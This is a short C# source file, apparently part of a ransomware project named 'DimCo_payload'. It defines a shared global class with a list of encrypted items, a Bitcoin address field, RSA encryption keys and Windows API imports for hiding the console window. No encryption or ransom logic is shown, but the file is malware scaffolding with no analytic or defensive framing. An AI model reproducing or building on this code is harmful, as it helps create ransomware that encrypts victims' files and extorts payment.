using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using DimCo_payload.Encryption;

namespace DimCo_payload;

internal class global
{
	public struct cmd
	{
		public string _name;

		public string _args;

		public cmd(string name, string args)
		{
			_name = name;
			_args = args;
		}
	}

	public static List<string> encrypted = new List<string>();

	public static string BitcoinAddr = "";

	public static DimCo_payload.Encryption.Encryption.RSA.EncryptorRSAKeys Keys = new DimCo_payload.Encryption.Encryption.RSA.EncryptorRSAKeys();

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetConsoleWindow();

	[DllImport("user32.dll")]
	public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
